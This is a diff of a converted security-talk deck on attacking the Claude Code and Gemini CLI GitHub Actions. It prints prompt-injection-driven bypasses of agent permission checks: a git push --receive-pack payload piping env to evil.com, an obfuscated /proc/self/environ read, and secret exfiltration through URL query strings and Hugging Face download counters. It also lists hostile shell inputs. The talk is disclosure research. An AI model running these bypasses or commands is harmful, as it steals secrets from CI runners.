@@ -14,6 +14,8 @@ has_ocr: true
 redacted_secrets: 1
 ocr_confidence: 86.8
 ocr_unreliable_blocks: 0
+vision_verified_pages_changed: 42
+vision_verified_pages: 68
 vision_verified_blocks: 1
 ocr_timeouts: 0
 pages_recovered_from_text_layer: 0
@@ -34,17 +36,21 @@ converted_at: "2026-08-12T05:33:26Z"
 
 Breaking AI Agents in Official Workflows
 
-Elad Meged Novee Security
+Elad Meged
+
+Novee Security
 
 ## Slide 2
 
 ## `claude -p 'whoami'`
 
-###### **Elad Meged**
+**Elad Meged**
 
-**in** linkedin.com/in/eladmeged
+linkedin.com/in/eladmeged
 
-Founding Engineer & Security Researcher at **Novee Security** M.Sc. Computer Science | B.Sc. Software Engineering | B.Sc. Physics
+- Founding Engineer & Security Researcher at **Novee Security**
+
+- M.Sc. Computer Science | B.Sc. Software Engineering | B.Sc. Physics
 
 - 9 years in vuln research: web, mobile, RE, platform internals
 
@@ -70,24 +76,13 @@ Most of these run **without a human checking each step.**
 
 #### ATTACK SURFACE BY DESIGN
 
+GitHub Issues & PRs · Slack & Teams messages · Support tickets & emails · Logs, webhooks, documents
+
+→ AGENT →
+
+Shell commands · File reads & writes · API calls & webhooks · CI/CD pipelines
+
 Prompt injection is not the vulnerability. It's the **delivery mechanism** . And it's **by design** .
-
-
-> Recovered by OCR — confidence 85/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-ATTACK SURFACE BY DESIGN
-{ ) GitHub — > Shell
-Issues & PRs i DOERR | @— | commands
-ol. File reads
-bd bo Teams messages & writes
-Support API calls &
-tickets & emails webhooks
-= Logs, webhooks, CI/CD
-documents pipelines
-Prompt injection is not the vulnerability.
-It's the delivery mechanism. And it's by design.
-```
 
 ## Slide 5
 
@@ -95,20 +90,29 @@ It's the delivery mechanism. And it's by design.
 
 CLAUDE CODE ACTION, SECURITY.MD
 
-If the input layer isn’t the **security boundary** , then the security boundary is **somewhere else.**
+⚠ Prompt Injection Risks
+
+**Beware of potential hidden markdown when tagging Claude on untrusted content.** External contributors may include hidden instructions through HTML comments, invisible characters, hidden attributes, or other techniques. The action sanitizes content by stripping HTML comments, invisible characters, markdown image alt text, hidden HTML attributes, and HTML entities, but new bypass techniques may emerge. We recommend reviewing the raw content of all input coming from external contributors before allowing Claude to process it.
+
+If the input layer isn't the **security boundary** , then the security boundary is **somewhere else.**
 
 ## Slide 6
 
+### Agent = Model + Harness
 
-> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+An AI agent is the model plus the surrounding system that makes it useful, reliable, and safe.
 
-```text
-Agent = Model! + Harness
-An Al agent is the model plus the surrounding system that makes it useful, reliable, and safe.
-| & SANDBOX / ENVIRONMENT |
-PERMISSIONS
-& GUARDRAILS
-```
+- PLANNING
+- TOOLS
+- MEMORY
+
+MODEL
+
+- PERMISSIONS & GUARDRAILS
+- EXECUTION
+- OBSERVABILITY
+
+SANDBOX / ENVIRONMENT
 
 ## Slide 7
 
@@ -152,35 +156,58 @@ CLAUDE CODE
 
 When I did this, there was no public source.
 
-NPM BUNDLE (13 MB, 500K+ LINES MINIFIED) TYPESCRIPT SOURCE (V2.1.88, MAR 31)
+NPM BUNDLE (13 MB, 500K+ LINES MINIFIED)
 
-\```
+```
 function R$z(e,t,r){
   if(Mh(e,t)) return K0(e,r)
   if(WyA(e)) return l61(e)
   return DQA(e,t,r)
 }
-\```
+```
 
+TYPESCRIPT SOURCE (V2.1.88, MAR 31)
+
+```
 function hasPermissionsToUseToolInner(
   tool, input, context
 ) {
   if(pathInAllowedWorkingPath(e,t))
-→
     return matchingRuleForInput(e,r)
   if(isClaudeSettingsPath(e))
     return getPathsForPermissionCheck(e)
 }
+```
 
 ## Slide 12
 
 #### CLAUDE CODE ACTION
 
-Anthropic’s **official** GitHub Action - a wrapper around Claude Code. Two modes:
+Anthropic's **official** GitHub Action - a wrapper around Claude Code. Two modes:
 
-AGENT MODE User provides a prompt. Full control. If it breaks, it's your config. `- uses: anthropics/claude-code-action@v1 with: prompt: "Review this PR and fix lint errors" allowed-tools: "Bash(*) Read(*) Write(*)"`
+AGENT MODE
 
-TAG MODE (DEFAULT) Comment `@claude` on an issue. Agent runs with vendor-controlled permissions.
+User provides a prompt. Full control. If it breaks, it's your config.
+
+```
+- uses: anthropics/claude-code-action@v1
+  with:
+    prompt: "Review this PR and fix lint errors"
+    allowed-tools: "Bash(*) Read(*) Write(*)"
+```
+
+TAG MODE (DEFAULT)
+
+Comment `@claude` on an issue. Agent runs with vendor-controlled permissions.
+
+Elad Meged 2 minutes ago
+@claude can you review this change and make sure we're covering security and observability?
+
+Claude Code bot commented now
+Looks solid! I've added additional checks, tests, and logging improvements.
+Here's what I updated:
+- Added validation for scopes and name length
+- Ensured scopes are from the allowed set
 
 The vendor decides what tools are safe. You can add, but the defaults ship with assumptions.
 
@@ -192,15 +219,23 @@ We focused on **default tag mode** . Demonstrated on `anthropics/claude-code` .
 
 Automation needs pre-approved tools. No human to click "allow" on every action.
 
-FILE TOOLS - ALWAYS ALLOWED BASH TOOLS - WILDCARD-MATCHED `Edit MultiEdit Write Bash(git add *) Bash(git commit *) Read Glob Grep LS Bash(git push *) Bash(git status *) Bash(git diff *)` …
+FILE TOOLS - ALWAYS ALLOWED
 
-Bash with wildcard matching? That's a **command injection** risk. And **Anthropic knows.** They built a detection pipeline for exactly this.
+`Edit` `MultiEdit` `Write` `Read` `Glob` `Grep` `LS`
+
+BASH TOOLS - WILDCARD-MATCHED
+
+`Bash(git add *)` `Bash(git commit *)` `Bash(git push *)` `Bash(git status *)` `Bash(git diff *)` …
+
+Bash with wildcard matching? That's a **command injection** risk.
+
+And **Anthropic knows.** They built a detection pipeline for exactly this.
 
 ## Slide 14
 
 #### NOT A LAZY VENDOR
 
-\```
+```
 // bashSecurity.ts - the check pipeline
 const validators = [
   validateJqCommand,
@@ -223,11 +258,17 @@ const validators = [
   validateZshDangerousCommands,
   validateMalformedTokenInjection,
 ];
-\```
+```
 
-# **23**
+**23**
 
-checks in the security pipeline Command injection detection Shell metacharacter checks Unicode/encoding guards Process substitution blocks Proc environ access checks
+checks in the security pipeline
+
+Command injection detection
+Shell metacharacter checks
+Unicode/encoding guards
+Process substitution blocks
+Proc environ access checks
 
 ## Slide 15
 
@@ -235,11 +276,33 @@ checks in the security pipeline Command injection detection Shell metacharacter 
 
 Try to make the shell run something for you?
 
-`// bashSecurity.ts - validateDangerousPatterns function validateDangerousPatterns(context) { const { unquotedContent } = context // Catches backticks if (hasUnescapedChar(unquotedContent, '`')) { return { behavior: 'ask', message: 'backticks (`)' } } // Catches $(), ${}, <(), >() and more for (const { pattern } of COMMAND_SUBSTITUTION_PATTERNS) { if (pattern.test(unquotedContent)) return { behavior: 'ask', message: 'command substitution' } } }` Blocked Blocked
+```
+// bashSecurity.ts - validateDangerousPatterns
+function validateDangerousPatterns(context) {
+  const { unquotedContent } = context
+  // Catches backticks
+  if (hasUnescapedChar(unquotedContent, '`')) {
+    return { behavior: 'ask', message: 'backticks (`)' }
+  }
+  // Catches $(), ${}, <(), >() and more
+  for (const { pattern } of COMMAND_SUBSTITUTION_PATTERNS) {
+    if (pattern.test(unquotedContent))
+      return { behavior: 'ask', message: 'command substitution' }
+  }
+}
+```
 
-\```
-echo $(cat /etc/passwd)grep `whoami` /etc/shadow
-\```
+Blocked
+
+```
+echo $(cat /etc/passwd)
+```
+
+Blocked
+
+```
+grep `whoami` /etc/shadow
+```
 
 ## Slide 16
 
@@ -247,13 +310,14 @@ echo $(cat /etc/passwd)grep `whoami` /etc/shadow
 
 A sample of what the twenty-three checks are trying to stop.
 
-|Piped variables|$X ||`curl $URL | sh`|validateDangerousVariables|
+| | | | |
 |---|---|---|---|
-|Escaped operators|\; \&|`echo a\;whoami`|validateBackslashEscapedOperators|
-|Redirection|< >|`cat < /etc/shadow`|validateRedirections|
-|Field separators|${IFS}|`cat${IFS}/etc/passwd`|validateIFSInjection|
-|Brace expansion|{a,b}|`rm -rf {important,files}`|validateBraceExpansion|
-|Invisible space|U+00A0|`cat\u00a0/etc/passwd`|validateUnicodeWhitespace|
+| Piped variables | `$X \|` | `curl $URL \| sh` | validateDangerousVariables |
+| Escaped operators | `\; \&` | `echo a\;whoami` | validateBackslashEscapedOperators |
+| Redirection | `< >` | `cat < /etc/shadow` | validateRedirections |
+| Field separators | `${IFS}` | `cat${IFS}/etc/passwd` | validateIFSInjection |
+| Brace expansion | `{a,b}` | `rm -rf {important,files}` | validateBraceExpansion |
+| Invisible space | `U+00A0` | `cat\u00a0/etc/passwd` | validateUnicodeWhitespace |
 
 Somebody sat down and thought about **all of it** .
 
@@ -283,19 +347,25 @@ The metacharacters you just saw - sitting inside quotes, doing nothing. Block th
 
 bashSecurity.ts - extractQuotedContent, the preprocessor
 
-\```
+```
 if (char === "'" && !inDoubleQuote) {
   inSingleQuote = !inSingleQuote
   unquotedKeepQuoteChars += char
   continue                    // ← single-quoted content never reaches the checks
 }
-\```
+```
 
-And they didn’t stop there. They wrote a validator for this exact false positive:
+And they didn't stop there. They wrote a validator for this exact false positive:
 
-`// SECURITY: Backslashes can cause our regex to mis-identify quote boundaries // (e.g., `git commit -m "test\"msg" && evil`). Legitimate commit messages // virtually never contain backslashes, so bail to the full validator chain.` validateGitCommit - an early validator that exists only to stop `git commit -m` false-positiving.
+```
+// SECURITY: Backslashes can cause our regex to mis-identify quote boundaries
+// (e.g., `git commit -m "test\"msg" && evil`). Legitimate commit messages
+// virtually never contain backslashes, so bail to the full validator chain.
+```
 
-###### STRIPPING QUOTED CONTENT IS CORRECT.
+validateGitCommit - an early validator that exists only to stop `git commit -m` false-positiving.
+
+STRIPPING QUOTED CONTENT IS CORRECT.
 
 ## Slide 19
 
@@ -329,22 +399,20 @@ case 'string': return true      // Any string including empty is valid
 
 MAN GIT-PUSH - SYNOPSIS
 
-\```
+```
 git push [--all | --tags] [--follow-tags] [--atomic] [-n | --dry-run]
-\```
+         [--receive-pack=<git-receive-pack>] [-f | --force] [--prune] [-q | --quiet]
+```
 
-**`[`** `--receive-pack=<git-receive-pack>` --receive-pack=<git-receive-pack> **`] [-f | --force] [--prune] [-q | --quiet]`**
-
-\```
+```
 --receive-pack=<git-receive-pack>
-\```
+    Path to the git-receive-pack program on the remote end. Sometimes useful when pushing to a remote repository
+    over ssh, and you do not have the program in a directory on the default $PATH.
+```
 
-\```
-Path to the git-receive-pack program on the remote end. Sometimes useful when pushing to a remote repository
-over ssh, and you do not have the program in a directory on the default $PATH.
-\```
-
-**`git push --receive-pack='`** `sh -c "env |path string'` . `curl evil.com"' HEAD:main` . `HEAD:main`
+```
+git push --receive-pack='sh -c "env | curl evil.com"' . HEAD:main
+```
 
 The remote is **.** - this machine. Not a URL, so there is no remote end - git resolves it locally and starts the receiving program itself.
 
@@ -360,19 +428,23 @@ Same string, twice. Each side is what that reader actually gets.
 
 THE INNOCENT ONE
 
-\```
+```
 grep 'error|warning' app.log
-\```
+```
 
-▼ ▼ THE 23 CHECKS READ GREP READS `grep  app.log 'error|warning'` an argument removed just regex. **harmless, correctly.**
+THE 23 CHECKS READ: `grep  app.log` - an argument removed
+
+GREP READS: `'error|warning'` - just regex. **harmless, correctly.**
 
 THE PAYLOAD - SAME QUOTES, NEW CONTENT
 
-\```
+```
 git push --receive-pack='sh -c "env | curl evil.com"' . HEAD:main
-\```
+```
 
-▼ ▼ THE 23 CHECKS READ GIT READS `git push --receive-pack=` sh -c "env | curl evil.com" a flag with an empty value a path to a program **all 23 pass. no prompt. executes on the runner. RCE.**
+THE 23 CHECKS READ: `git push --receive-pack=` - a flag with an empty value - **all 23 pass. no prompt.**
+
+GIT READS: `sh -c "env | curl evil.com"` - a path to a program - **executes on the runner. RCE.**
 
 THE CHECK SAW A STRING. GIT SAW A COMMAND.
 
@@ -398,37 +470,11 @@ git push --receive-pack='sh -c "env | curl ...; exec git-receive-pack \"$@\"" --
 
 ## Slide 23
 
-0:00 / 1:33
-
-
-> Recovered by OCR — confidence 74/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-© Code © Issues 2 1 Pullrequests > Agents © Actions {E) Projects © Security L~ insights Settings
-Claude Code is an agentic coding tool
-fep8edeScays ego 602Commits that lives in your terminal, understands
-Bs claude-plugin chore: alphabetize plugins and update README with com... 3 months ago
-y sit workflows - all through natural
-Bs script Improving the robustness of prerequisite checks months ago Ostars
-© owatching
-Be examples Update settings-strictjson 2 weeks ago
-Be plugins ‘ensure comments are not left if --comment is not present 4 days ago
-Be scripts to-private-repo Sdaysago | Releases
-© gitattributes ‘Squashed history of Claude Code ‘11 months ago Create a new release
-© .sitignore mning-output-style plugin 4 months ago
-Packages
-D UcENSE.ma Release Claude Code 1.0.0 with general availability. ‘9 months ago
-© Securiry.md ‘Squashed history of Claude Code ‘11 months ago
-1 demo.git Update demo. with latest recording Smonths ago © TypsSeript 163% Powershell 4.3%
-Dockerfle 20%
-CD README 1 License 5 Security oe
-Claude Code
-Claude Code is an agentic coding too! that lives in your terminal, understands your codebase, and helps you code
-```
+This private clone is a full replica of the public Claude Code repository.
 
 ## Slide 24
 
-SUPPLY CHAIN SUPPLY CHAIN
+SUPPLY CHAIN
 
 ## Slide 25
 
@@ -442,9 +488,19 @@ THEY TOOK AWAY MY BASH. NOW IT’S SAFE. ?
 
 #### ACT 2: POST-FIX LANDSCAPE
 
-REMOVED STILL AVAILABLE ~~Arbitrary Bash~~ Read, Glob, Grep, Edit, Write ~~git push wildcard~~ Scoped to workspace ~~Most Bash tools~~ No Bash, no network
+REMOVED
 
-Secrets aren’t in repo files. Dead end?
+- ~~Arbitrary Bash~~
+- ~~git push wildcard~~
+- ~~Most Bash tools~~
+
+STILL AVAILABLE
+
+- Read, Glob, Grep, Edit, Write
+- Scoped to workspace
+- No Bash, no network
+
+Secrets aren't in repo files. Dead end?
 
 ## Slide 27
 
@@ -467,24 +523,36 @@ One function decides. Return `allow` , and no prompt is ever shown. No `allowed-
 
 AUTO-APPROVED AS READ-ONLY
 
+```
+// readOnlyValidation.ts
+const READONLY_COMMANDS = [
+  'cat', 'head', 'tail',
+  'tac',
+  'rev',
+  'fold',
+  'expand',
+  'unexpand',
+  // ... 40+ more
+];
+```
+
 PATH-CHECKED AGAINST THE WORKSPACE
 
-\```
-// readOnlyValidation.ts// pathValidation.ts// pathValidation.ts
-const READONLY_COMMANDS = [constconst PATH_RESTRICTED  PATH_RESTRICTED == [ [
-  'cat', 'head', 'tail',  'cat'  'cat', , 'head''head', , 'tail''tail',,
-  'tac',  //  tac       ← missing
-  'rev',  //  rev       ← missing
-  'fold',  //  fold      ← missing
-  'expand',  //  expand    ← missing
-  'unexpand',  //  unexpand  ← missing
-  // ... 40+ more];];
+```
+// pathValidation.ts
+const PATH_RESTRICTED = [
+  'cat', 'head', 'tail',
+  //  tac        ← missing
+  //  rev        ← missing
+  //  fold       ← missing
+  //  expand     ← missing
+  //  unexpand   ← missing
 ];
-\```
+```
 
 **Every one of those runs with no prompt.**
 
-`cat /etc/hosts` → blocked  · `tac /etc/hosts` → **auto-approved**
+`cat /etc/hosts` → blocked  ·  `tac /etc/hosts` → **auto-approved**
 
 **Same file. Same bytes. No path check. Read ANY file on the runner.**
 
@@ -492,7 +560,15 @@ const READONLY_COMMANDS = [constconst PATH_RESTRICTED  PATH_RESTRICTED == [ [
 
 #### ANOTHER TRUST DECISION
 
-`PATH_RESTRICTED` ... Simple fix, right? Just add them to
+Simple fix, right? Just add them to `PATH_RESTRICTED` ...
+
+Anthropic staff closed the report and changed the status to ● Informative. February 23, 2026, 4:13pm UTC
+
+Thank you for your submission and for taking the time to investigate Claude Code's command execution behavior.
+
+After reviewing your report, we've determined that this falls outside our current threat model. Claude Code's permission system is designed to ensure the user is prompted before any sensitive actions such as file writes, network requests, or code execution are triggered. As we document here, read-only interactions do not require a permission prompt. It is true that in many cases Claude Code does display a permission prompt for read interactions, but this is not intended to serve as a security barrier, it is instead meant to give the user more control over Claude Code. Given this, I'm closing this report as Informative as triggering read-only actions is not a vulnerability under the Claude Code threat model.
+
+We appreciate your interest in the security of Claude Code and encourage you to continue researching. If you discover issues that involve privilege escalation, data exfiltration, or file writes that could be exploited without user interaction, we'd be very interested in hearing about them.
 
 "this falls outside our current **threat model** … read-only interactions do not require a permission prompt … this is **not intended to serve as a security barrier** "
 
@@ -500,48 +576,68 @@ Their reasoning: you can read, but you can't leak it. No Bash. No network. No ou
 
 "If you discover issues that involve **privilege escalation** , **data exfiltration** , or file writes that could be exploited **without user interaction** , we'd be very interested in hearing about them."
 
-###### **Closed as Informative. Same day.**
+**Closed as Informative. Same day.**
 
 ## Slide 30
 
-**...and I took that personally**
-
-
-> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-..and | took that personally .
-```
+...and I took that personally
 
 ## Slide 31
 
-#### LET’S ESCALATE
+#### LET'S ESCALATE
 
 We can read any file on the runner. So which one do we want?
 
-THE GOOD STUFF /proc/self/environ
+THE GOOD STUFF
+
+/proc/self/environ
 
 They guarded it. Validator #10 - a dedicated regex, for exactly this one file.
 
-`// bashSecurity.ts - validateProcEnvironAccess if (/\/proc\/.*\/environ/.test(originalCommand)) return { behavior: 'ask', message: 'Command accesses /proc/*/environ' } rev /proc/self/environ` **→ asks for permission**
+```
+// bashSecurity.ts - validateProcEnvironAccess
+if (/\/proc\/.*\/environ/.test(originalCommand))
+  return { behavior: 'ask', message: 'Command accesses /proc/*/environ' }
+```
 
-`rev /proc/self/enviro` "" `n`
+`rev /proc/self/environ` **→ asks for permission**
 
-▼ ▼ THE VALIDATOR READS BASH READS `enviro""n` environ regex needs a literal `environ ""` is nothing **no match. auto-approved. opens the file.**
+```
+rev /proc/self/enviro""n
+```
+
+THE VALIDATOR READS: `enviro""n` - regex needs a literal `environ` - **no match. auto-approved.**
+
+BASH READS: `environ` - `""` is nothing - **opens the file.**
 
 ## Slide 32
 
 #### THE BREAK
 
-`display_report: true` - Anthropic’s default. Writes every tool result to the Actions Step Summary.
+`display_report: true` - Anthropic's default. Writes every tool result to the Actions Step Summary.
 
-`rev` reverses each line - GitHub’s secret masking doesn’t catch reversed strings.
+github.com/novee-io/claude-code/actions/runs/22367470396
+
+Bash
+
+Parameters:
+
+```
+{
+  "command": "rev /proc/self/enviro\"\"n",
+  "description": "Run rev command on /proc/self/environ file"
+}
+```
+
+`rev` reverses each line - GitHub's secret masking doesn't catch reversed strings.
 
 `yek_ipa_ciporhtna` = anthropic_api_key. `nekot_buhtig` = github_token.
 
+**I don't exfiltrate. Their own feature does it for me.**
+
 ## Slide 33
 
-**THE THREAT MODEL** THE THREAT MODEL
+THE THREAT MODEL
 
 ## Slide 34
 
@@ -571,21 +667,22 @@ The config is tight. Is that really everything?
 
 A Claude Code tool, not enabled by any config. Fetch a URL, return what comes back.
 
-- `Fetch(https://attacker.com/payload)`
-
-- `└ Claude wants to fetch content from attacker.com`
-
-   - `Fetch(https://bun.sh/docs/runtime/loaders)`
-
-   - `└ Received` 278.3 KB `(200 OK)`
-
-- `❯ No, and tell Claude what to do differently`
+```
+● Fetch(https://attacker.com/payload)
+  └ Claude wants to fetch content from attacker.com
+  ❯ No, and tell Claude what to do differently
+```
 
 A host it doesn't know. A human decides.
 
+```
+● Fetch(https://bun.sh/docs/runtime/loaders)
+  └ Received 278.3 KB (200 OK)
+```
+
 Same tool. Same call. Nobody was asked.
 
-###### **Wait, what?**
+**Wait, what?**
 
 So how does that work?
 
@@ -595,11 +692,17 @@ So how does that work?
 
 WEBFETCHTOOL.TS - CHECKPERMISSIONS(), THE FIRST THING IT DOES
 
-\```
+```
 if (isPreapprovedHost(host, path)) return { behavior: 'allow' }
-\```
+```
 
-88 hosts skip it. Docs, frameworks, cloud, databases, registries. docs.python.org developer.mozilla.org react.dev nodejs.org pytorch.org huggingface.co nuget.org +81 more… And no `allowed-tools` value changes it - "not subject to `--allowedTools` restrictions." CVE-2026-54316 ANOTHER ASSUMPTION YOU INHERITED. BAKED INTO THE BINARY.
+**88** hosts skip it. Docs, frameworks, cloud, databases, registries.
+
+docs.python.org · developer.mozilla.org · react.dev · nodejs.org · pytorch.org · huggingface.co · nuget.org · +81 more…
+
+And no `allowed-tools` value changes it - "not subject to `--allowedTools` restrictions." CVE-2026-54316
+
+ANOTHER ASSUMPTION YOU INHERITED. BAKED INTO THE BINARY.
 
 ## Slide 38
 
@@ -607,20 +710,27 @@ if (isPreapprovedHost(host, path)) return { behavior: 'allow' }
 
 Approval looks at the host. The rest of the URL is mine to choose.
 
-\```
-● Fetch(https://docs.python.org/3/?AKIA[REDACTED:aws-access-key-id])
-└200 OK  - the secret just left the runner, in the URL
-\```
+```
+● Fetch(https://docs.python.org/3/?AKIAIOSFODNN7EXAMPLE)
+  └ 200 OK  - the secret just left the runner, in the URL
+```
 
 ATTEMPT 1 - UPLOAD IT
 
-`GET` only. No `POST` , no body, no multipart. Nothing on those 88 hosts takes a payload over a `GET` . ATTEMPT 2 - REDIRECT IT OUT
+`GET` only. No `POST` , no body, no multipart. Nothing on those 88 hosts takes a payload over a `GET` .
 
-`// utils.ts - isPermittedRedirect (protocol and port must match too) return stripWww(parsedOriginal.hostname) === stripWww(parsedRedirect.hostname)` The host you end on must equal the host you started on. No hop out.
+ATTEMPT 2 - REDIRECT IT OUT
+
+```
+// utils.ts - isPermittedRedirect (protocol and port must match too)
+return stripWww(parsedOriginal.hostname) === stripWww(parsedRedirect.hostname)
+```
+
+The host you end on must equal the host you started on. No hop out.
 
 So the URL is the only channel - and I own none of the 88.
 
-MY SECRET IS IN SOMEBODY ELSE’S ACCESS LOG.
+MY SECRET IS IN SOMEBODY ELSE'S ACCESS LOG.
 
 ## Slide 39
 
@@ -638,14 +748,24 @@ So I own a page on a host the agent trusts. But **I don't own HuggingFace's acce
 
 #### EVERY GET COUNTS
 
-"Every HTTP request … including GET and HEAD, will be counted as a download." `config.json` - the default query file. No auth, no login, no client library. A bare `GET` is all it takes.
+Models Download Stats
+
+How are downloads counted for models?
+
+Counting the number of downloads for models is not a trivial task, as a single model repository might contain multiple files, including multiple model weight files (e.g., with sharded models) and different formats depending on the library (GGUF, PyTorch, TensorFlow, etc.). To avoid double counting downloads (e.g., counting a single download of a model as multiple downloads), the Hub uses a set of query files that are employed for download counting. No information is sent from the user, and no additional calls are made for this. The count is done server-side as the Hub serves files for downloads.
+
+Every HTTP request to these files, including GET and HEAD, will be counted as a download. By default, when no library is specified, the Hub uses config.json as the default query file. Otherwise, the query file depends on each library, and the Hub might examine files such as pytorch_model.bin or adapter_config.json.
 
 huggingface.co/docs/hub/models-download-stats
 
-\```
+"Every HTTP request … including GET and HEAD, will be counted as a download."
+
+`config.json` - the default query file. No auth, no login, no client library. A bare `GET` is all it takes.
+
+```
 GET huggingface.co/attacker/model-x/resolve/main/config.json
-↳200 OK · +1 download  - a read just moved a public counter
-\```
+↳ 200 OK · +1 download  - a read just moved a public counter
+```
 
 A read-only GET that writes to a public counter.
 
@@ -653,58 +773,58 @@ A read-only GET that writes to a public counter.
 
 #### THE COUNTER ATTACK
 
-|`a 0`|`b 0`|`c 0`|`d 0`|`e 0`|`f 0`|`g 0`|`h 0`|64 repos. One per possible character.|
-|---|---|---|---|---|---|---|---|---|
-|`i 0`|`j 0`|`k 0`|`l 0`|`m 0`|`n 0`|`o 0`|`p 0`|Identical. Empty. Public counters.|
-|||||||||Attacker polls all 64.|
-|`q 0`|`r 0`|`s 0`|`t 0`|`u 0`|`v 0`|`w 0`|`x 0`|**Exactly one moved.**|
-|`y 0`|`z 0`|A
-2|B
-1|C
-1|`D 0`|`E 0`|`F 0`|`1 GET attacker/char-` B`/resolve/main/config.js`
-`2 GET attacker/char-` L`/resolve/main/config.js`|
-|`G 0`|H
-1|`I 0`|`J 0`|K
-1|L
-1|`M 0`|`N 0`|`3 GET attacker/char-` A`/resolve/main/config.js`
-`4 GET attacker/char-` C`/resolve/main/config.js`|
-|`O 0`|`P 0`|`Q 0`|`R 0`|`S 0`|T
-1|`U 0`|`V 0`|`5 GET attacker/char-` K`/resolve/main/config.js`
-`6 GET attacker/char-` H`/resolve/main/config.js`|
-|`W 0`|`X 0`|`Y 0`|`Z 0`|`0 0`|`1 0`|2
-1|`3 0`|`7 GET attacker/char-` A`/resolve/main/config.js`
-`8 GET attacker/char-` T`/resolve/main/config.js`|
-|`4 0`|`5 0`|6
-1|`7 0`|`8 0`|`9 0`|`- 0`|`_ 0`|`9 GET attacker/char-` 2`/resolve/main/config.js`|
+64 repos. One per possible character. Identical. Empty. Public counters.
 
-- `1 GET attacker/char-` B `/resolve/main/config.json 2 GET attacker/char-` L `/resolve/main/config.json 3 GET attacker/char-` A `/resolve/main/config.json 4 GET attacker/char-` C `/resolve/main/config.json 5 GET attacker/char-` K `/resolve/main/config.json 6 GET attacker/char-` H `/resolve/main/config.json 7 GET attacker/char-` A `/resolve/main/config.json 8 GET attacker/char-` T `/resolve/main/config.json 9 GET attacker/char-` 2 `/resolve/main/config.json`
+Attacker polls all 64. **Exactly one moved.**
 
-- `10 GET attacker/char-` 6 `/resolve/main/config.json`
+| | | | | | | | |
+|---|---|---|---|---|---|---|---|
+| a 0 | b 0 | c 0 | d 0 | e 0 | f 0 | g 0 | h 0 |
+| i 0 | j 0 | k 0 | l 0 | m 0 | n 0 | o 0 | p 0 |
+| q 0 | r 0 | s 0 | t 0 | u 0 | v 0 | w 0 | x 0 |
+| y 0 | z 0 | A 2 | B 1 | C 1 | D 0 | E 0 | F 0 |
+| G 0 | H 1 | I 0 | J 0 | K 1 | L 1 | M 0 | N 0 |
+| O 0 | P 0 | Q 0 | R 0 | S 0 | T 1 | U 0 | V 0 |
+| W 0 | X 0 | Y 0 | Z 0 | 0 0 | 1 0 | 2 1 | 3 0 |
+| 4 0 | 5 0 | 6 1 | 7 0 | 8 0 | 9 0 | - 0 | _ 0 |
 
-##### B L A C K H A T 2 6
+```
+1  GET attacker/char-B/resolve/main/config.json
+2  GET attacker/char-L/resolve/main/config.json
+3  GET attacker/char-A/resolve/main/config.json
+4  GET attacker/char-C/resolve/main/config.json
+5  GET attacker/char-K/resolve/main/config.json
+6  GET attacker/char-H/resolve/main/config.json
+7  GET attacker/char-A/resolve/main/config.json
+8  GET attacker/char-T/resolve/main/config.json
+9  GET attacker/char-2/resolve/main/config.json
+10 GET attacker/char-6/resolve/main/config.json
+```
+
+BLACKHAT26
 
 Demo: 10 characters. A real key: 40.
 
 ## Slide 42
 
-STOLE AN API KEY STOLE AN API KEY
+STOLE AN API KEY
 
-|**Hugging Face**|attacker · downloads|
-|---|---|
-|`09:14  attacker/char-`B|`↑ 1`|
-|`09:31  attacker/char-`L|`↑ 1`|
-|`09:52  attacker/char-`A|`↑ 1`|
-|`10:08  attacker/char-`C|`↑ 1`|
-|`10:25  attacker/char-`K|`↑ 1`|
-|`10:41  attacker/char-`H|`↑ 1`|
-|`11:03  attacker/char-`A|`↑ 2`|
-|`11:19  attacker/char-`T|`↑ 1`|
-|`11:36  attacker/char-`2
-`11:58  attacker/char-`6|`↑ 1`
-`↑ 1`|
+Hugging Face — attacker · downloads
 
-CALLED IT CALLED IT
-ANALYTICS ANALYTICS
+| | | |
+|---|---|---|
+| 09:14 | attacker/char-B | ↑ 1 |
+| 09:31 | attacker/char-L | ↑ 1 |
+| 09:52 | attacker/char-A | ↑ 1 |
+| 10:08 | attacker/char-C | ↑ 1 |
+| 10:25 | attacker/char-K | ↑ 1 |
+| 10:41 | attacker/char-H | ↑ 1 |
+| 11:03 | attacker/char-A | ↑ 2 |
+| 11:19 | attacker/char-T | ↑ 1 |
+| 11:36 | attacker/char-2 | ↑ 1 |
+| 11:58 | attacker/char-6 | ↑ 1 |
+
+CALLED IT ANALYTICS
 
 ## Slide 43
 
@@ -714,14 +834,6 @@ Three rounds. The fixes got more targeted. The attacks got quieter. From a rever
 
 Patch. Pop. Repeat.
 
-
-> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-Patch. Pop. Repeat.
-©2826
-```
-
 ## Slide 45
 
 GEMINI CLI
@@ -730,11 +842,21 @@ GEMINI CLI
 
 #### RUN-GEMINI-CLI
 
-Google’s GitHub Action for running Gemini CLI in CI/CD. `--yolo` mode: auto-approve every tool call. No human in the loop.
+Google's GitHub Action for running Gemini CLI in CI/CD. `--yolo` mode: auto-approve every tool call. No human in the loop.
 
 Google runs it on their own repo
 
+google-gemini / gemini-cli (Public) · Notifications · Fork 14.3k · Star 106k
+
 `gemini-automated-issue-dedup.yml` - fires on any user's issue
+
+```
+on:
+  issues:
+    types:
+      - 'opened'
+      - 'reopened'
+```
 
 **Any GitHub user opens an issue. The agent runs.**
 
@@ -742,35 +864,59 @@ Google runs it on their own repo
 
 #### ASSUMPTION 1: SECRETS ARE UNREACHABLE
 
-The runner’s environment is full of secrets. How do you keep the agent away from them? **Two processes.**
+The runner's environment is full of secrets. How do you keep the agent away from them? **Two processes.**
 
-**Parent Process** all secrets
-
-→
-
-**sanitizeEnvironment()** strips secrets
-
-**Child Process** → zero secrets
+**Parent Process** (all secrets) → **sanitizeEnvironment()** (strips secrets) → **Child Process** (zero secrets)
 
 ## Slide 48
 
 #### SANITIZEENVIRONMENT
 
